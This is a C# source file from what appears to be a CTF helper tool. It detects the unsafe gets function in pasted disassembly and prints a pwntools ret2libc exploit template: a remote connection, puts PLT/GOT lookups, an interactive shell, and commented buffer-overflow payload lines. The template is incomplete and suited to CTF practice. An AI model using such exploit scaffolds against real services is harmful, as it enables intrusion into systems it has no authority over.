using System;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace CTFTool
{
    public class PwnRet2Libc
    {
        //属性
        private RichTextBox m_cIn;
        private RichTextBox m_cExp;
        private RichTextBox m_cOut;

        //构造
        public PwnRet2Libc(RichTextBox cIn, RichTextBox cExp, RichTextBox cOut)
        {
            //清空显示区域
            cExp.Text = cOut.Text = "";

            //初始化
            m_cIn = cIn;
            m_cExp = cExp;
            m_cOut = cOut;
        }

        //开始
        public void Start()
        {
            Boolean bExec = false;
            bExec = bExec || PwnRet2Libc0();
            if (!bExec)
            {
                m_cExp.Text = m_cExp.Text + "分析失败" + Environment.NewLine;
            }
        }

        private Boolean PwnRet2Libc0()
        {
            if (m_cIn.Text.Contains("gets"))
            {
                //说明
                m_cExp.Text += "函数中存在漏洞函数gets!";

                //输出
                m_cOut.Text += "from pwn import *\n";
                m_cOut.Text += "\n";
                Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
                Match vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
                }
                else
                {
                    m_cOut.Text += "process = remote('{IP}', {Port})\n";
                }
                m_cOut.Text += "elf = ELF('/root/{Name}')\n";
                m_cOut.Text += "libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n";
                m_cOut.Text += "# libc = ELF('/lib32/libc.so.6')\n";
                m_cOut.Text += "puts_plt = elf.plt['puts']\n";
                m_cOut.Text += "puts_got = elf.got['puts']\n";
                m_cOut.Text += "main_addr = {Addr}\n";
                //vRegex = new Regex("\\[rbp-(.*?)h\\]");
                //vMatch = vRegex.Match(m_cIn.Text);
                //if (vMatch.Success)
                //{
                //    m_cOut.Text += "payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
                //    m_cOut.Text += "# payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
                //    m_cOut.Text += "process.sendline(payload)\n";
                //}
                //context(os='Linux', arch='amd64', log_level='debug')
                //context = 1
                //def main():
                //  if context == 1:
                //      peiqi = process("")
                //  else:
                //      peiqi = remote("IP", Port)
                //  payload = b'a' * (0x20 - 0x18) + p64(1926)
                //  peiqi.recvuntil("")
                //  peiqi.sendline(payload)
                m_cOut.Text += "process.interactive()\n";

                return true;
            }
            return false;
        }
    }
}